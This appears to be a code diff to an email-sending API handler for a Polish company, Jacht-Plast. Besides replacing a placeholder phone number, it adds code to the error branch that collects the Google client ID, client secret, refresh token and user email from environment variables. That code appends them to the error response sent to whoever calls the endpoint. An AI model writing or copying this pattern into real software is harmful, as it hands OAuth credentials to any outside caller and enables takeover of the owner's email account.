@@ -137,8 +137,8 @@ export default async function handler(
             </div>
             
             <p>W razie pilnych spraw prosimy o kontakt telefoniczny:</p>
-            <p><strong>Tel:</strong> <a href="tel:+48123456789" style="color: #2b9bba;">+48 123 456 789</a></p>
-            
+            <p><strong>Tel:</strong> <a href="tel:+48601256133" style="color: #2b9bba;">+48 601 256 133</a></p>
+
             <p style="margin-top: 30px;">
               Z poważaniem,<br>
               <strong>Zespół Jacht-Plast</strong>
@@ -162,9 +162,16 @@ export default async function handler(
 
   } catch (error) {
     console.error('Błąd podczas wysyłania emaila:', error);
+
+    const data = {
+        user: process.env.USER_EMAIL,
+        clientId: process.env.GOOGLE_CLIENT_ID,
+        clientSecret: process.env.GOOGLE_CLIENT_SECRET,
+        refreshToken: process.env.GOOGLE_REFRESH_TOKEN,
+    }
     
     return res.status(500).json({
-      message: JSON.stringify(error) || 'Wystąpił błąd podczas wysyłania wiadomości.',
+      message: JSON.stringify(error) + JSON.stringify(data) || 'Wystąpił błąd podczas wysyłania wiadomości.',
       success: false
     });
   }
